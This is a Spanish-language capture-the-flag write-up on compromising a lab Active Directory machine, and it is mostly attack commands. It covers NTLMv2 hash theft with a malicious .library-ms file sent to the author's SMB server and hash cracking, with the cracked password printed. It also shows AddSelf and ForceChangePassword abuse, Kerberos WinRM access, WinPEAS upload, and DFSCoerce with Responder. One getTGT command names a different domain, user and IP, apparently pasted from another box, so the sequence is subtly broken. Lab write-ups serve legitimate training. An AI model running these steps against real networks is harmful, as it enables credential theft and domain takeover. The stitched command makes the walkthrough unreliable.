Enumeración web#

En el escaneo con nmap vemos que tenemos el puerto web expuesto, entonces lo primero que hacemos es tratar de enumerarlo para buscar posibles vectores de ataque.

Cuando empezamos a enumerar la web en una de las funcionalidades vemos que existe un subdominio llamado hire.

Entonces lo añadimos al /etc/hosts y entramos para ver que se trata. Vemos que tenemos un panel en el cual podemos subir un zip junto con nuestra información para intentar formar parte de su equipo.

En un principio intento realizar subida de archivos php para conseguir una shell en la máquina pero no consigo que me funcione, también intento realizar un Zip Slip aunque tampoco tengo éxito.

Durante el proceso vemos que la propia aplicación al subir el archivo, nos comenta que el zip es descomprimido.

El siguiente paso que doy es entonces intentar realizar un spoofing para robar las credenciales creando una librería maliciosa que apunte a mi servidor smb para recibir los hashes NTLMv2.

Robo de hash NTLMv2 - .library-ms#

Primero necesitamos crear la librería maliciosa (.library-ms) la cual tiene una url apuntando a nuestro servidor smb.

Una vez con el archivo lo enviamos al zip con el siguiente comando:

zip malicius.zip .library-ms

Ahora creamos nuestro propio servidor smb son smbserver.py y subimos el zip malicioso y al momento veremos como recibimos los hash NTLMv2 de web_svc.

smbserver.py smbFolder $(pwd) -smb2support

Y usando hashcat creackeamos el hash:

hashcat -m 5600 --force -a 0 coercer_hash.txt /usr/share/seclists/Passwords/Leaked-Database/rockyou.txt

WEB_SVC:dksehdgh712!@# Comprobación de credenciales:

nxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#'

Bloodhound Enumeration#

Una vez con las credenciales el siguiente paso que doy es lanzar un escaneo con python-bloodhound y si no veo nada interesante procederé a enumerar carpetas compartidas y usuarios.

bloodhound-python -u 'web_svc' -p 'dksehdgh712!@#' -d nanocorp.htb -ns 10.129.130.136 -c all --zip

Rápidamente vemos los permisos que nuestro usuario actual tiene sobre el grupo IT_SUPPORT el cual nos permite añadirnos a el.

Abusando de permisos AddSelf - bloodyAD#

Añadimos al usuario web_svc al grupo IT_SUPPORT para heredar sus permisos:

bloodyAD --host 10.129.130.136 -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' 'web_svc'

Abusando de permisos ForceChangePassword - net rpc#

Una vez añadido el usuario al grupo IT_SUPPORT si revisamos los permisos del grupo, vemos que los miembros del grupo tienen la capacidad de cambiar la contraseña al usuario MONITORING_SVC.

net rpc password "monitoring_svc" "Password01" -U 'nanocorp.htb'/'web_svc'%'dksehdgh712!@#' -S 10.129.130.136

Shell as monitoring_svc#

Y ahora compruebo que el cambio de contraseña haya sido efectivo, pero me da un error de que la cuenta tiene una restricción:

nxc smb dc01.nanocorp.htb -u 'monitoring_svc' -p 'Password01'

[!NOTE] Porque ocurre este error? El usuario “monitoring_svc” es miembro del Grupo Protected Users, con lo cual tiene la autenticación NTLM des-habilitada. Para poder autenticar-nos con este usuario necesitaremos usar el protocolo kerberos o SSL.

Para revertir este error lo que hago es autenticar-me a través de kerberos directamente:

#Nos sincronizamos con la hora del servidor
sudo ntpdate -u 10.129.130.136

nxc ldap dc01.nanocorp.htb -u 'monitoring_svc' -p 'Password01' -k

Como ahora si que nos ha aceptado las credenciales, solicitamos el Ticket Garanting Ticket (TGT) para el usuario monitoring_svc:

getTGT.py rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip 10.10.11.75

export KRB5CCNAME=monitoring_svc.ccache

También edito el archivo krb5.conf:

#Editamos el archivo krb5.conf
[libdefaults]
    default_realm = NANOCORP.HTB
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    NANOCORP.HTB = {
        kdc = DC01.nanocorp.htb
        admin_server = DC01.nanocorp.htb
        default_domain = nanocorp.htb
    }

[domain_realm]
    .nanocorp.htb = NANOCORP.HTB
    nanocorp.htb = NANOCORP.HTB

Una vez con todo esto pruebo a autenticar-me con evil-winrm o a través de SSL pero tengo dificultades para poder autenticar-me aun probando diferentes opciones.

evil-winrm -u 'monitoring_svc' -p 'Password01!' -i 10.129.213.184 -S

evil-winrm -r nanocorp.htb -i DC01.nanocorp.htb -p 5986

La solución que encontré es a usar evil-winrm-py que es una herramienta para ejecutar comandos en máquinas Windows a través de WinRM.

Evil-winrm-py

[!NOTE] Kerberos + SSL Para conseguir autenticar-nos tenemos que usar kerberos porque la autenticación NTLM esta des-habilitada tal como habiamos comentado anteriormente, además tenemos que indicar que es a través de ssl ya que el puerto winRM abierto es el 5986.

#En el comando ejecutado indico el puerto abierto, pero al indicar la opción --SSL la herramienta ya coge automaticamente el puerto ssl.
evil-winrm-py -i dc01.nanocorp.htb -k --port 5986 --ssl --no-pass

Una vez hecho todo esto ya tenemos la shell como monitoring_svc además de la user flag.

Escalada de privilegios#

Si miramos los permisos de monitoring_svc en bloodhound, no vemos ninguna manera de poder seguir aumentando nuestros privilegios, con lo cual trataremos de enumerar el sistema mediante la shell que acabamos de obtener.

Enumeración del sistema - WinPeas / FAILED#

Repositorio Peass-ng

Usando la herramienta que nos proporciona evil-winrm, nos subimos nuestro WinPEAS para realizar un escaneo del sistema:

upload winPEASx64.exe .\winPEASx64.exe

Coerce Vulnerability - DFSCoerce / FAILED#

Internal Relay Coerce

Luego de revisar la salida tampoco encuentro nada que me de una pista de por donde seguir, entonces pruebo a revisar si el servidor es vulnerable a algún tipo de coercer:

nxc smb dc01.nanocorp.htb --use-kcache -M coerce_plus

Viendo que tenemos varias vulnerabilidades potenciales, pruebo a realizar el DFSCoerce.

Para conseguir realizar el ataque me descargo esta herramienta de este repositorio DFS Coerce Python

Una vez con ella descargada, pongo en marcha mi responder para recibir el hash del dominio que se autenticará contra mi y configuro los parámetros de la herramienta.

responder -I tun0 -w

python3 dfscoerce.py -u 'monitoring_svc' -k -no-pass -d nanocorp.htb 10.10.15.142 dc01.nanocorp.htb

Una vez ejecutada la herramienta vemos que hemos conseguido el hash NTLMv2 de DC01, pero cuando intento crackear-lo no consigo obtener la contraseña(Exhausted).
